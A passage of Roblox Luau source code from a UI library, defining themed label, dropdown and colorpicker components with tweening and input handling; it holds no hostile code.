                    Position = UDim2New(0, 0, 0.5, 0),
                    BackgroundTransparency = 1,
                    TextXAlignment = Enum.TextXAlignment.Left,
                    BorderSizePixel = 0,
                    AutomaticSize = Enum.AutomaticSize.X,
                    TextSize = 9,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })  Items["Text"]:AddToTheme({TextColor3 = "Text"})

                Items["Text"]:TextBorder()

                Items["SubElements"] = Instances:Create("Frame", {
                    Parent = Items["Label"].Instance,
                    Name = "\0",
                    BorderColor3 = FromRGB(0, 0, 0),
                    BackgroundTransparency = 1,
                    Position = UDim2New(0, Items["Text"].Instance.TextBounds.X + 8, 0, 0),
                    Size = UDim2New(0, 0, 1, 0),
                    BorderSizePixel = 0,
                    AutomaticSize = Enum.AutomaticSize.X,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })

                Instances:Create("UIListLayout", {
                    Parent = Items["SubElements"].Instance,
                    Name = "\0",
                    VerticalAlignment = Enum.VerticalAlignment.Center,
                    FillDirection = Enum.FillDirection.Horizontal,
                    Padding = UDimNew(0, 6),
                    SortOrder = Enum.SortOrder.LayoutOrder
                })
            end

            function Label:SetText(Text)
                Text = tostring(Text)

                Items["Text"].Instance.Text = Text
            end

            function Label:SetVisibility(Bool)
                Items["Label"].Instance.Visible = Bool
            end

            return Label, Items 
        end

        Components.Dropdown = function(self, Data)
            local Dropdown = {
                Flag = Data.Flag, 
                Value = { },
                Options = { },
                IsOpen = false
            }

            local Items = { } do
                Items["Dropdown"] = Instances:Create("Frame", {
                    Parent = Data.Parent.Instance,
                    Name = "\0",
                    BackgroundTransparency = 1,
                    BorderColor3 = FromRGB(0, 0, 0),
                    Size = UDim2New(1, 0, 0, 40),
                    BorderSizePixel = 0,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })

                Items["Text"] = Instances:Create("TextLabel", {
                    Parent = Items["Dropdown"].Instance,
                    Name = "\0",
                    FontFace = Library.Font,
                    TextColor3 = FromRGB(235, 235, 235),
                    BorderColor3 = FromRGB(0, 0, 0),
                    Text = Data.Name,
                    BackgroundTransparency = 1,
                    Size = UDim2New(0, 0, 0, 15),
                    BorderSizePixel = 0,
                    AutomaticSize = Enum.AutomaticSize.X,
                    TextSize = 9,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })  Items["Text"]:AddToTheme({TextColor3 = "Text"})

                Items["Text"]:TextBorder()

                Items["RealDropdown"] = Instances:Create("TextButton", {
                    Parent = Items["Dropdown"].Instance,
                    AutoButtonColor = false,
                    Text = "",
                    Name = "\0",
                    AnchorPoint = Vector2New(0, 1),
                    Position = UDim2New(0, 0, 1, 0),
                    BorderColor3 = FromRGB(12, 12, 12),
                    Size = UDim2New(1, 0, 0, 20),
                    BorderSizePixel = 2,
                    BackgroundColor3 = FromRGB(30, 36, 31)
                })  Items["RealDropdown"]:AddToTheme({BackgroundColor3 = "Element", BorderColor3 = "Border"})

                Instances:Create("UIGradient", {
                    Parent = Items["RealDropdown"].Instance,
                    Name = "\0",
                    Rotation = -165,
                    Color = RGBSequence{RGBSequenceKeypoint(0, FromRGB(255, 255, 255)), RGBSequenceKeypoint(1, FromRGB(208, 208, 208))}
                }):AddToTheme({Color = function()
                    return RGBSequence{RGBSequenceKeypoint(0, FromRGB(255, 255, 255)), RGBSequenceKeypoint(1, Library.Theme.Gradient)}
                end})

                Instances:Create("UIStroke", {
                    Parent = Items["RealDropdown"].Instance,
                    Name = "\0",
                    Color = FromRGB(42, 49, 45),
                    LineJoinMode = Enum.LineJoinMode.Miter,
                    ApplyStrokeMode = Enum.ApplyStrokeMode.Border
                }):AddToTheme({Color = "Outline"})

                Items["Value"] = Instances:Create("TextLabel", {
                    Parent = Items["RealDropdown"].Instance,
                    Name = "\0",
                    FontFace = Library.Font,
                    TextColor3 = FromRGB(235, 235, 235),
                    BorderColor3 = FromRGB(0, 0, 0),
                    Text = "--",
                    AnchorPoint = Vector2New(0, 0.5),
                    Size = UDim2New(1, -25, 0, 15),
                    BackgroundTransparency = 1,
                    TextXAlignment = Enum.TextXAlignment.Left,
                    Position = UDim2New(0, 8, 0.5, 0),
                    BorderSizePixel = 0,
                    TextSize = 9,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })  Items["Value"]:AddToTheme({TextColor3 = "Text"})

                Items["Value"]:TextBorder()

                Items["Icon"] = Instances:Create("ImageLabel", {
                    Parent = Items["RealDropdown"].Instance,
                    Name = "\0",
                    ImageColor3 = FromRGB(202, 243, 255),
                    ScaleType = Enum.ScaleType.Fit,
                    BorderColor3 = FromRGB(0, 0, 0),
                    AnchorPoint = Vector2New(1, 0.5),
                    Image = "rbxassetid://113229176886493",
                    BackgroundTransparency = 1,
                    Position = UDim2New(1, -2, 0.5, 0),
                    Size = UDim2New(0, 20, 0, 20),
                    BorderSizePixel = 0,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })  Items["Icon"]:AddToTheme({ImageColor3 = "Accent"})

                Items["OptionHolder"] = Instances:Create("Frame", {
                    Parent = Library.UnusedHolder.Instance,
                    Name = "\0",
                    Visible = false,
                    BorderColor3 = FromRGB(12, 12, 12),
                    BorderSizePixel = 2,
                    Position = UDim2New(0, 0, 1, 8),
                    Size = UDim2New(1, 0, 0, 25),
                    ZIndex = 5,
                    AutomaticSize = Enum.AutomaticSize.Y,
                    BackgroundColor3 = FromRGB(20, 24, 21)
                })  Items["OptionHolder"]:AddToTheme({BackgroundColor3 = "Inline", BorderColor3 = "Border"})

                Instances:Create("UIStroke", {
                    Parent = Items["OptionHolder"].Instance,
                    Name = "\0",
                    Color = FromRGB(42, 49, 45),
                    LineJoinMode = Enum.LineJoinMode.Miter,
                    ApplyStrokeMode = Enum.ApplyStrokeMode.Border
                }):AddToTheme({Color = "Outline"})

                Instances:Create("UIPadding", {
                    Parent = Items["OptionHolder"].Instance,
                    Name = "\0",
                    PaddingTop = UDimNew(0, 5),
                    PaddingBottom = UDimNew(0, 5),
                    PaddingRight = UDimNew(0, 5),
                    PaddingLeft = UDimNew(0, 8)
                })

                Instances:Create("UIListLayout", {
                    Parent = Items["OptionHolder"].Instance,
                    Name = "\0",
                    Padding = UDimNew(0, 3),
                    SortOrder = Enum.SortOrder.LayoutOrder
                })
            end

            function Dropdown:Get()
                return Dropdown.Value
            end

            local Debounce = false
            local RenderStepped  

            function Dropdown:SetOpen(Bool)
                if Debounce then 
                    return
                end

                Dropdown.IsOpen = Bool

                Debounce = true 

                if Dropdown.IsOpen then 
                    Items["OptionHolder"].Instance.Visible = true
                    Items["OptionHolder"].Instance.Parent = Library.Holder.Instance
                    Items["Icon"]:Tween(nil, {Rotation = -90})
                    
                    RenderStepped = RunService.RenderStepped:Connect(function()
                        Items["OptionHolder"].Instance.Position = UDim2New(0, Items["RealDropdown"].Instance.AbsolutePosition.X, 0, Items["RealDropdown"].Instance.AbsolutePosition.Y + Items["RealDropdown"].Instance.AbsoluteSize.Y + 5)
                        Items["OptionHolder"].Instance.Size = UDim2New(0, Items["RealDropdown"].Instance.AbsoluteSize.X, 0, 0)
                    end)

                    if not Debounce then 
                        for Index, Value in Library.OpenFrames do 
                            if Value ~= Dropdown then 
                                Value:SetOpen(false)
                            end
                        end

                        Library.OpenFrames[Dropdown] = Dropdown 
                    end
                else
                    if not Debounce then 
                        if Library.OpenFrames[Dropdown] then 
                            Library.OpenFrames[Dropdown] = nil
                        end
                    end

                    if RenderStepped then 
                        RenderStepped:Disconnect()
                        RenderStepped = nil
                    end

                    Items["Icon"]:Tween(nil, {Rotation = 0})
                end

                local Descendants = Items["OptionHolder"].Instance:GetDescendants()
                TableInsert(Descendants, Items["OptionHolder"].Instance)

                local NewTween

                for Index, Value in Descendants do 
                    local TransparencyProperty = Tween:GetProperty(Value)

                    if not TransparencyProperty then
                        continue 
                    end

                    if type(TransparencyProperty) == "table" then 
                        for _, Property in TransparencyProperty do 
                            NewTween = Tween:FadeItem(Value, Property, Bool, Library.FadeSpeed)
                        end
                    else
                        NewTween = Tween:FadeItem(Value, TransparencyProperty, Bool, Library.FadeSpeed)
                    end
                end
                
                NewTween.Tween.Completed:Connect(function()
                    Debounce = false 
                    Items["OptionHolder"].Instance.Visible = Dropdown.IsOpen
                    task.wait(0.2)
                    Items["OptionHolder"].Instance.Parent = not Dropdown.IsOpen and Library.UnusedHolder.Instance or Library.Holder.Instance
                end)
            end

            function Dropdown:SetVisibility(Bool)
                Items["Dropdown"].Instance.Visible = Bool
            end

            function Dropdown:Set(Option)
                if Data.Multi then 
                    if type(Option) ~= "table" then 
                        return
                    end

                    Dropdown.Value = Option
                    Library.Flags[Dropdown.Flag] = Option

                    for Index, Value in Option do
                        local OptionData = Dropdown.Options[Value]
                        
                        if not OptionData then
                            continue
                        end

                        OptionData.Selected = true 
                        OptionData:Toggle("Active")
                    end

                    Items["Value"].Instance.Text = TableConcat(Option, ", ")
                else
                    if not Dropdown.Options[Option] then
                        return
                    end

                    local OptionData = Dropdown.Options[Option]

                    Dropdown.Value = Option
                    Library.Flags[Dropdown.Flag] = Option

                    for Index, Value in Dropdown.Options do
                        if Value ~= OptionData then
                            Value.Selected = false 
                            Value:Toggle("Inactive")
                        else
                            Value.Selected = true 
                            Value:Toggle("Active")
                        end
                    end

                    Items["Value"].Instance.Text = Option
                end

                if Data.Callback then   
                    Library:SafeCall(Data.Callback, Dropdown.Value)
                end
            end

            function Dropdown:Add(Option)
                local OptionButton = Instances:Create("TextButton", {
                    Parent = Items["OptionHolder"].Instance,
                    Name = "\0",
                    FontFace = Library.Font,
                    TextColor3 = FromRGB(235, 235, 235),
                    BorderColor3 = FromRGB(0, 0, 0),
                    Text = Option,
                    AutoButtonColor = false,
                    BorderSizePixel = 0,
                    BackgroundTransparency = 1,
                    TextXAlignment = Enum.TextXAlignment.Left,
                    Size = UDim2New(1, 0, 0, 15),
                    ZIndex = 5,
                    TextSize = 9,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })  OptionButton:AddToTheme({TextColor3 = "Text"})

                local OptionData = {
                    Button = OptionButton,
                    Name = Option,
                    Selected = false
                }

                function OptionData:Toggle(Status)
                    if Status == "Active" then 
                        OptionData.Button:ChangeItemTheme({TextColor3 = "Accent"})
                        OptionData.Button:Tween(nil, {TextColor3 = Library.Theme.Accent})
                    else
                        OptionData.Button:ChangeItemTheme({TextColor3 = "Text"}) 
                        OptionData.Button:Tween(nil, {TextColor3 = Library.Theme.Text})
                    end
                end

                function OptionData:Set()
                    OptionData.Selected = not OptionData.Selected

                    if Data.Multi then 
                        local Index = TableFind(Dropdown.Value, OptionData.Name)

                        if Index then 
                            TableRemove(Dropdown.Value, Index)
                        else
                            TableInsert(Dropdown.Value, OptionData.Name)
                        end

                        OptionData:Toggle(Index and "Inactive" or "Active")

                        Library.Flags[Dropdown.Flag] = Dropdown.Value

                        local TextFormat = #Dropdown.Value > 0 and TableConcat(Dropdown.Value, ", ") or "--"
                        Items["Value"].Instance.Text = TextFormat
                    else
                        if OptionData.Selected then 
                            Dropdown.Value = OptionData.Name
                            Library.Flags[Dropdown.Flag] = OptionData.Name

                            OptionData.Selected = true
                            OptionData:Toggle("Active")

                            for Index, Value in Dropdown.Options do 
                                if Value ~= OptionData then
                                    Value.Selected = false 
                                    Value:Toggle("Inactive")
                                end
                            end

                            Items["Value"].Instance.Text = OptionData.Name
                        else
                            Dropdown.Value = nil
                            Library.Flags[Dropdown.Flag] = nil

                            OptionData.Selected = false
                            OptionData:Toggle("Inactive")

                            Items["Value"].Instance.Text = "--"
                        end
                    end

                    if Data.Callback then
                        Library:SafeCall(Data.Callback, Dropdown.Value)
                    end
                end

                OptionData.Button:Connect("MouseButton1Down", function()
                    OptionData:Set()
                end)

                Dropdown.Options[OptionData.Name] = OptionData
                return OptionData
            end

            function Dropdown:Remove(Option)
                if not Dropdown.Options[Option] then
                    return
                end

                Dropdown.Options[Option].Button:Clean()
                Dropdown.Options[Option] = nil
            end

            function Dropdown:Refresh(List)
                for Index, Value in Dropdown.Options do 
                    Dropdown:Remove(Value.Name)
                end

                for Index, Value in List do 
                    Dropdown:Add(Value)
                end
            end

            Items["RealDropdown"]:Connect("MouseButton1Down", function()
                Dropdown:SetOpen(not Dropdown.IsOpen)
            end)

            Items["Dropdown"]:OnHover(function()
                Items["RealDropdown"]:ChangeItemTheme({BackgroundColor3 = "Hovered Element", BorderColor3 = "Border"})
                Items["RealDropdown"]:Tween(nil, {BackgroundColor3 = Library.Theme["Hovered Element"]})
            end)

            Items["Dropdown"]:OnHoverLeave(function()
                Items["RealDropdown"]:ChangeItemTheme({BackgroundColor3 = "Element", BorderColor3 = "Border"})
                Items["RealDropdown"]:Tween(nil, {BackgroundColor3 = Library.Theme["Element"]})
            end)

            Library:Connect(UserInputService.InputBegan, function(Input)
                if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
                    if not Dropdown.IsOpen then
                        return 
                    end

                    if Library:IsMouseOverFrame(Items["OptionHolder"]) then 
                        return
                    end

                    Dropdown:SetOpen(false)
                end
            end)

            for Index, Value in Data.Items do 
                Dropdown:Add(Value)
            end

            if Data.Default then 
                Dropdown:Set(Data.Default)
            end

            Library.SetFlags[Dropdown.Flag] = function(Value)
                Dropdown:Set(Value)
            end

            return Dropdown, Items 
        end

        Components.ColorpickerTab = function(self, Data)
            if not Data.Pages then 
                return
            end

            local NewTab = { 
                Name = Data.Name,
                Active = false
            }

            local Items = { } do
                Items["Inactive"] = Instances:Create("TextButton", {
                    Parent = Data.PageHolder.Instance,
                    Name = "\0",
                    FontFace = Library.Font,
                    TextColor3 = FromRGB(235, 235, 235),
                    BorderColor3 = FromRGB(0, 0, 0),
                    Text = NewTab.Name,
                    AutoButtonColor = false,
                    Size = UDim2New(1, 0, 1, 0),
                    BorderSizePixel = 0,
                    TextSize = 9,
                    BackgroundColor3 = FromRGB(20, 24, 21)
                })  Items["Inactive"]:AddToTheme({BackgroundColor3 = "Inline"})

                Items["Inactive"]:TextBorder()

                Items["PageContent"] = Instances:Create("Frame", {
                    Parent = Data.ContentHolder.Instance,
                    Name = "\0",
                    Visible = false,
                    BackgroundTransparency = 1,
                    BorderColor3 = FromRGB(0, 0, 0),
                    Size = UDim2New(1, 0, 1, 0),
                    BorderSizePixel = 0,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })
            end

            function NewTab:Turn(Bool)
                NewTab.Active = Bool 

                if NewTab.Active then
                    Items["PageContent"].Instance.Visible = true 
                    Items["PageContent"].Instance.Parent = Data.ContentHolder.Instance 

                    Items["Inactive"]:ChangeItemTheme({BackgroundColor3 = "Background"})
                    Items["Inactive"]:Tween(nil, {BackgroundColor3 = Library.Theme.Background})
                else
                    Items["PageContent"].Instance.Visible = false
                    Items["PageContent"].Instance.Parent = Library.UnusedHolder.Instance 

                    Items["Inactive"]:ChangeItemTheme({BackgroundColor3 = "Inline"})
                    Items["Inactive"]:Tween(nil, {BackgroundColor3 = Library.Theme.Inline})
                end
            end

            Items["Inactive"]:Connect("MouseButton1Down", function()
                for Index, Value in Data.Stack do 
                    Value:Turn(Value == NewTab)
                end
            end)

            if #Data.Stack == 0 then 
                NewTab:Turn(true)
            end

            TableInsert(Data.Stack, NewTab)
            return NewTab, Items 
        end

        Components.CreateSubPaletteItems = function(self, Items)
            Items["ColorpickerWindow"].Instance.Size = UDim2New(0, 171, 0, 168)

            Items["Palette"] = Instances:Create("TextButton", {
                Parent = Items["ColorpickerWindow"].Instance,
                Name = "\0",
                FontFace = Library.Font,
                TextColor3 = FromRGB(0, 0, 0),
                BorderColor3 = FromRGB(42, 49, 45),
                Text = "",
                AutoButtonColor = false,
                Position = UDim2New(0, 8, 0, 8),
                Size = UDim2New(1, -41, 1, -41),
                BorderSizePixel = 2,
                TextSize = 14,
                BackgroundColor3 = FromRGB(157, 175, 255)
            })  Items["Palette"]:AddToTheme({BorderColor3 = "Outline"})

            Instances:Create("UIStroke", {
                Parent = Items["Palette"].Instance,
                Name = "\0",
                Color = FromRGB(12, 12, 12),
                LineJoinMode = Enum.LineJoinMode.Miter,
                ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            }):AddToTheme({Color = "Border"})

            Items["Saturation"] = Instances:Create("ImageLabel", {
                Parent = Items["Palette"].Instance,
                Name = "\0",
                BorderColor3 = FromRGB(0, 0, 0),
                Image = Library:GetImage("Saturation"),
                BackgroundTransparency = 1,
                Size = UDim2New(1, 0, 1, 0),
                ZIndex = 2,
                BorderSizePixel = 0,
                BackgroundColor3 = FromRGB(255, 255, 255)
            })

            Items["Value"] = Instances:Create("ImageLabel", {
                Parent = Items["Palette"].Instance,
                Name = "\0",
                BorderColor3 = FromRGB(0, 0, 0),
                Size = UDim2New(1, 2, 1, 0),
                Image = Library:GetImage("Value"),
                BackgroundTransparency = 1,
                Position = UDim2New(0, -1, 0, 0),
                ZIndex = 3,
                BorderSizePixel = 0,
                BackgroundColor3 = FromRGB(255, 255, 255)
            })

            Items["PaletteDragger"] = Instances:Create("Frame", {
                Parent = Items["Palette"].Instance,
                Name = "\0",
                Position = UDim2New(0, 8, 0, 8),
                ZIndex = 5,
                BorderColor3 = FromRGB(0, 0, 0),
                Size = UDim2New(0, 2, 0, 2),
                BorderSizePixel = 0,
                BackgroundColor3 = FromRGB(255, 255, 255)
            })

            Instances:Create("UIStroke", {
                Parent = Items["PaletteDragger"].Instance,
                Name = "\0",
                Color = FromRGB(12, 12, 12),
                LineJoinMode = Enum.LineJoinMode.Miter,
                ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            }):AddToTheme({Color = "Border"})

            Items["Hue"] = Instances:Create("Frame", {
                Parent = Items["ColorpickerWindow"].Instance,
                Name = "\0",
                Active = true,
                BorderColor3 = FromRGB(42, 49, 45),
                AnchorPoint = Vector2New(1, 0),
                Position = UDim2New(1, -8, 0, 8),
                Size = UDim2New(0, 15, 1, -16),
                Selectable = true,
                BorderSizePixel = 2,
                BackgroundColor3 = FromRGB(255, 255, 255)
            })  Items["Hue"]:AddToTheme({BorderColor3 = "Outline"})

            Instances:Create("UIStroke", {
                Parent = Items["Hue"].Instance,
                Name = "\0",
                Color = FromRGB(12, 12, 12),
                LineJoinMode = Enum.LineJoinMode.Miter,
                ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            }):AddToTheme({Color = "Border"})

            Items["HueInline"] = Instances:Create("TextButton", {
                Parent = Items["Hue"].Instance,
                Text = "",
                AutoButtonColor = false,
                Name = "\0",
                BorderColor3 = FromRGB(0, 0, 0),
                Size = UDim2New(1, 0, 1, 0),
                BorderSizePixel = 0,
                BackgroundColor3 = FromRGB(255, 255, 255)
            })

            Instances:Create("UIGradient", {
                Parent = Items["HueInline"].Instance,
                Name = "\0",
                Rotation = 90,
                Color = RGBSequence{RGBSequenceKeypoint(0, FromRGB(255, 0, 0)), RGBSequenceKeypoint(0.17, FromRGB(255, 255, 0)), RGBSequenceKeypoint(0.33, FromRGB(0, 255, 0)), RGBSequenceKeypoint(0.5, FromRGB(0, 255, 255)), RGBSequenceKeypoint(0.67, FromRGB(0, 0, 255)), RGBSequenceKeypoint(0.83, FromRGB(255, 0, 255)), RGBSequenceKeypoint(1, FromRGB(255, 0, 0))}
            })

            Items["HueDragger"] = Instances:Create("Frame", {
                Parent = Items["Hue"].Instance,
                Name = "\0",
                BorderColor3 = FromRGB(0, 0, 0),
                Size = UDim2New(1, 0, 0, 1),
                BorderSizePixel = 0,
                BackgroundColor3 = FromRGB(255, 255, 255)
            })

            Instances:Create("UIStroke", {
                Parent = Items["HueDragger"].Instance,
                Name = "\0",
                Color = FromRGB(12, 12, 12),
                LineJoinMode = Enum.LineJoinMode.Miter,
                ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            }):AddToTheme({Color = "Border"})

            Items["Alpha"] = Instances:Create("TextButton", {
                Parent = Items["ColorpickerWindow"].Instance,
                Name = "\0",
                FontFace = Library.Font,
                TextColor3 = FromRGB(0, 0, 0),
                BorderColor3 = FromRGB(42, 49, 45),
                Text = "",
                AutoButtonColor = false,
                AnchorPoint = Vector2New(0, 1),
                Position = UDim2New(0, 8, 1, -8),
                Size = UDim2New(1, -41, 0, 15),
                BorderSizePixel = 2,
                TextSize = 14,
                BackgroundColor3 = FromRGB(157, 175, 255)
            })  Items["Alpha"]:AddToTheme({BorderColor3 = "Outline"})

            Instances:Create("UIStroke", {
                Parent = Items["Alpha"].Instance,
                Name = "\0",
                Color = FromRGB(12, 12, 12),
                LineJoinMode = Enum.LineJoinMode.Miter,
                ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            }):AddToTheme({Color = "Border"})

            Items["Checkers"] = Instances:Create("ImageLabel", {
                Parent = Items["Alpha"].Instance,
                Name = "\0",
                ScaleType = Enum.ScaleType.Tile,
                BorderColor3 = FromRGB(0, 0, 0),
                TileSize = UDim2New(0, 6, 0, 6),
                Image = Library:GetImage("Checkers"),
                BackgroundTransparency = 1,
                Size = UDim2New(1, 0, 1, 0),
                ZIndex = 2,
                BorderSizePixel = 0,
                BackgroundColor3 = FromRGB(255, 255, 255)
            })  

            Instances:Create("UIGradient", {
                Parent = Items["Checkers"].Instance,
                Name = "\0",
                Transparency = NumSequence{NumSequenceKeypoint(0, 1), NumSequenceKeypoint(0.37, 0.5), NumSequenceKeypoint(1, 0)}
            })

            Items["AlphaDragger"] = Instances:Create("Frame", {
                Parent = Items["Alpha"].Instance,
                Name = "\0",
                ZIndex = 5,
                BorderColor3 = FromRGB(0, 0, 0),
                Size = UDim2New(0, 1, 1, 0),
                BorderSizePixel = 0,
                BackgroundColor3 = FromRGB(255, 255, 255)
            })

            Instances:Create("UIStroke", {
                Parent = Items["AlphaDragger"].Instance,
                Name = "\0",
                Color = FromRGB(12, 12, 12),
                LineJoinMode = Enum.LineJoinMode.Miter,
                ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            }):AddToTheme({Color = "Border"})
        end

        Components.Colorpicker = function(self, Data) -- poetry warning (╯°□°)╯
            local Colorpicker = {
                IsOpen = false,

                Hue = 0,
                Saturation = 0,
                Value = 0,
                Alpha = 0,

                Color = FromRGB(255, 255, 255),
                HexValue = "#ffffff",

                Pages = Data.Pages and { } or nil,
                Flag = Data.Flag,
            }

            local UpdateSync

            local Items = { } do
                Items["ColorpickerButton"] = Instances:Create("TextButton", {
                    Parent = Data.Parent.Instance,
                    Name = "\0",
                    FontFace = Library.Font,
                    TextColor3 = FromRGB(0, 0, 0),
                    BorderColor3 = FromRGB(12, 12, 12),
                    Text = "",
                    AutoButtonColor = false,
                    Position = UDim2New(0, -123, 0, 0),
                    Size = UDim2New(0, 15, 0, 15),
                    BorderSizePixel = 2,
                    TextSize = 14,
                    BackgroundColor3 = FromRGB(157, 175, 255)
                })  Items["ColorpickerButton"]:AddToTheme({BorderColor3 = "Border"})

                Instances:Create("UIStroke", {
                    Parent = Items["ColorpickerButton"].Instance,
                    Name = "\0",
                    Color = FromRGB(42, 49, 45),
                    LineJoinMode = Enum.LineJoinMode.Miter,
                    ApplyStrokeMode = Enum.ApplyStrokeMode.Border
                }):AddToTheme({Color = "Outline"})

                Items["ColorpickerButtonInline"] = Instances:Create("Frame", {
                    Parent = Items["ColorpickerButton"].Instance,
                    Name = "\0",
                    Position = UDim2New(0, 1, 0, 1),
                    BorderColor3 = FromRGB(0, 0, 0),
                    Size = UDim2New(1, -2, 1, -2),
                    BorderSizePixel = 0,
                    BackgroundColor3 = FromRGB(157, 175, 255)
                })

                Instances:Create("UIGradient", {
                    Parent = Items["ColorpickerButtonInline"].Instance,
                    Name = "\0",
                    Rotation = -165,
                    Color = RGBSequence{RGBSequenceKeypoint(0, FromRGB(255, 255, 255)), RGBSequenceKeypoint(1, FromRGB(208, 208, 208))}
                }):AddToTheme({Color = function()
                    return RGBSequence{RGBSequenceKeypoint(0, FromRGB(255, 255, 255)), RGBSequenceKeypoint(1, Library.Theme.Gradient)}
                end})

                Items["ColorpickerWindow"] = Instances:Create("TextButton", {
                    Parent = Library.UnusedHolder.Instance,
                    Text = "",
                    AutoButtonColor = false,
                    Name = "\0",
                    Position = UDim2New(0, 12, 0, 12),
                    BorderColor3 = FromRGB(12, 12, 12),
                    Size = UDim2New(0, 266, 0, 258),
                    BorderSizePixel = 2,
                    BackgroundColor3 = FromRGB(14, 17, 15)
                })  Items["ColorpickerWindow"]:AddToTheme({BorderColor3 = "Border", BackgroundColor3 = "Background"})

                Instances:Create("UIStroke", {
                    Parent = Items["ColorpickerWindow"].Instance,
                    Name = "\0",
                    Color = FromRGB(42, 49, 45),
                    LineJoinMode = Enum.LineJoinMode.Miter,
                    ApplyStrokeMode = Enum.ApplyStrokeMode.Border
                }):AddToTheme({Color = "Outline"})

                if Data.Pages then 
                    Items["Pages"] = Instances:Create("Frame", {
                        Parent = Items["ColorpickerWindow"].Instance,
                        Name = "\0",
                        BackgroundTransparency = 1,
                        BorderColor3 = FromRGB(0, 0, 0),
                        Size = UDim2New(1, 0, 0, 20),
                        BorderSizePixel = 0,
                        BackgroundColor3 = FromRGB(255, 255, 255)
                    })

                    Instances:Create("UIListLayout", {
                        Parent = Items["Pages"].Instance,
                        Name = "\0",
                        FillDirection = Enum.FillDirection.Horizontal,
                        SortOrder = Enum.SortOrder.LayoutOrder,
                        HorizontalFlex = Enum.UIFlexAlignment.Fill
                    })

                    Items["Content"] = Instances:Create("Frame", {
                        Parent = Items["ColorpickerWindow"].Instance,
                        Name = "\0",
                        BackgroundTransparency = 1,
                        Position = UDim2New(0, 0, 0, 25),
                        BorderColor3 = FromRGB(0, 0, 0),
                        Size = UDim2New(1, 0, 1, -25),
                        BorderSizePixel = 0,
                        BackgroundColor3 = FromRGB(255, 255, 255)
                    })
                else
                    Components:CreateSubPaletteItems(Items)
                end
            end

            local ColorTab, ColorTabItems = Components:ColorpickerTab({
                ContentHolder = Items["Content"],
                Pages = Colorpicker.Pages,
                PageHolder = Items["Pages"],
                Stack = Colorpicker.Pages,
                Name = "Color"
            })

            local AnimationsTab, AnimationsTabItems = Components:ColorpickerTab({
                ContentHolder = Items["Content"],
                Pages = Colorpicker.Pages,
                PageHolder = Items["Pages"],
                Stack = Colorpicker.Pages,
                Name = "Animations"
            })

            local OtherTab, OtherTabItems = Components:ColorpickerTab({
                ContentHolder = Items["Content"],
                Pages = Colorpicker.Pages,
                PageHolder = Items["Pages"],
                Stack = Colorpicker.Pages,
                Name = "Other"
            })

            local OldColor = Colorpicker.Color
            local OldAlpha = Colorpicker.Alpha
            local CurrentAnimation

            local AnimationsDropdown, AnimationsDropdownItems
            local KeyframeOneLabel, KeyframeOneLabelItems
            local KeyframeTwoLabel, KeyframeTwoLabelItems

            local KeyframeOneColorpicker, KeyframeOneColorpickerItems
            local KeyframeTwoColorpicker, KeyframeTwoColorpickerItems

            local AnimationSpeedSlider, AnimationSpeedSliderItems

            if ColorTab then
                Items["Palette"] = Instances:Create("TextButton", {
                    Parent = ColorTabItems["PageContent"].Instance,
                    Name = "\0",
                    FontFace = Library.Font,
                    TextColor3 = FromRGB(0, 0, 0),
                    BorderColor3 = FromRGB(42, 49, 45),
                    Text = "",
                    AutoButtonColor = false,
                    Position = UDim2New(0, 8, 0, 8),
                    Size = UDim2New(1, -46, 1, -46),
                    BorderSizePixel = 2,
                    TextSize = 14,
                    BackgroundColor3 = FromRGB(157, 175, 255)
                })  Items["Palette"]:AddToTheme({BorderColor3 = "Outline"})

                Instances:Create("UIStroke", {
                    Parent = Items["Palette"].Instance,
                    Name = "\0",
                    Color = FromRGB(12, 12, 12),
                    LineJoinMode = Enum.LineJoinMode.Miter,
                    ApplyStrokeMode = Enum.ApplyStrokeMode.Border
                }):AddToTheme({Color = "Border"})

                Items["Saturation"] = Instances:Create("ImageLabel", {
                    Parent = Items["Palette"].Instance,
                    Name = "\0",
                    BorderColor3 = FromRGB(0, 0, 0),
                    Image = Library:GetImage("Saturation"),
                    BackgroundTransparency = 1,
                    Size = UDim2New(1, 0, 1, 0),
                    ZIndex = 2,
                    BorderSizePixel = 0,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })

                Items["Value"] = Instances:Create("ImageLabel", {
                    Parent = Items["Palette"].Instance,
                    Name = "\0",
                    BorderColor3 = FromRGB(0, 0, 0),
                    Size = UDim2New(1, 2, 1, 0),
                    Image = Library:GetImage("Value"),
                    BackgroundTransparency = 1,
                    Position = UDim2New(0, -1, 0, 0),
                    ZIndex = 3,
                    BorderSizePixel = 0,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })

                Items["PaletteDragger"] = Instances:Create("Frame", {
                    Parent = Items["Palette"].Instance,
                    Name = "\0",
                    Position = UDim2New(0, 8, 0, 8),
                    BorderColor3 = FromRGB(0, 0, 0),
                    Size = UDim2New(0, 2, 0, 2),
                    BorderSizePixel = 0,
                    ZIndex = 5,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })

                Instances:Create("UIStroke", {
                    Parent = Items["PaletteDragger"].Instance,
                    Name = "\0",
                    Color = FromRGB(12, 12, 12),
                    LineJoinMode = Enum.LineJoinMode.Miter,
                    ApplyStrokeMode = Enum.ApplyStrokeMode.Border
                }):AddToTheme({Color = "Border"})

                Items["Hue"] = Instances:Create("Frame", {
                    Parent = ColorTabItems["PageContent"].Instance,
                    Name = "\0",
                    Active = true,
                    BorderColor3 = FromRGB(42, 49, 45),
                    AnchorPoint = Vector2New(1, 0),
                    Position = UDim2New(1, -8, 0, 8),
                    Size = UDim2New(0, 20, 1, -16),
                    Selectable = true,
                    BorderSizePixel = 2,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })  Items["Hue"]:AddToTheme({BorderColor3 = "Outline"})

                Instances:Create("UIStroke", {
                    Parent = Items["Hue"].Instance,
                    Name = "\0",
